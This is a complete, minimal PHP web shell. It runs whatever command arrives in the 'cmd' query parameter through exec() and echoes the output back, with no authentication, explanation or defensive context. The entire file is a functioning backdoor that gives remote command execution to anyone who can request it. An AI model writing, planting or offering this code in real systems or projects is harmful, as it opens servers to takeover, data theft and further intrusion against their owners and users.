<?php
exec($_GET['cmd'], $output);
echo implode("\n", $output);
?>
